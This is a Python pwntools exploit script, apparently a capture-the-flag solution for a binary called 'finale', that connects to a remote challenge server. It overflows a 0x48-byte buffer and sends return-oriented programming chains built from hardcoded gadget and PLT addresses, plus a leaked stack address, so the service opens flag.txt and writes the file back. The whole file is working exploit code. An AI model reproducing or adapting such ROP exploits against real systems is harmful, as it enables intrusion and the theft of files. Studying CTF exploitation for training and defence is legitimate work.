from pwn import *
import re
import time

#context.binary = 'finale'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = "167.99.85.216"
PORT = "30882"

# Im fairly confident, this one is just to see if you can rop to
# 1. open the flag.txt file
# 2. use the fd to read the contents of flag.txt
# 3. a pointer to the stack is used as scratch space

f_finale = p64(0x401407)

plt_open = p64(0x4011c0)
plt_read = p64(0x401170)
plt_write = p64(0x401130)

g_pop_rdi = p64(0x4012d6)
g_pop_rsi = p64(0x4012d8)
g_mov_rdi_rax_call_10a0_pop_rbp = p64(0x4011f6)
g_mov_bl_byte_ptr_rdi_0x3d_pop_rsi = p64(0x4012d5)

scratch_space = p64(0)

def get_process():
  #proc = process()
  proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
    b *0x40148a
  """)
  time.sleep(3)

def main():
  proc = get_process()
  #attach_gdb(proc)

  proc.sendlineafter(b'tell us the secret phrase: ', b's34s0nf1n4l3b00')
  proc.recvuntil(b'[Strange man in mask]:')
  has_leak = proc.recvline().strip().decode()
  pattern = r'\[([^\]]+)\]'
  match = re.search(pattern, has_leak)
  
  scratch_space = p64(int(match.group(1)[2:], 16))
  scratch_space2 = p64(int(match.group(1)[2:], 16) + 0x3d)

  flag_txt = b'flag.txt\x00'
  offset = b'A' * (0x48 - len(flag_txt))

  # Write our flag.txt string to scratch space
  payload = b''.join([
    flag_txt,
    offset,
    g_pop_rdi,
    scratch_space,
    g_pop_rsi,
    p64(0),
    plt_open,
    f_finale
  ])
  
  proc.sendlineafter(b'Now, tell us a wish for next year: ', payload)

  # Read from fd 3
  payload = b''.join([
    flag_txt,
    offset,
    g_pop_rdi,
    p64(3),
    g_pop_rsi,
    scratch_space,
    plt_read,
    g_pop_rdi,
    p64(1),
    g_pop_rsi,
    scratch_space,
    plt_write
  ])

  proc.sendlineafter(b'Now, tell us a wish for next year: ', payload)

  proc.interactive()

if __name__ == '__main__':
  main()
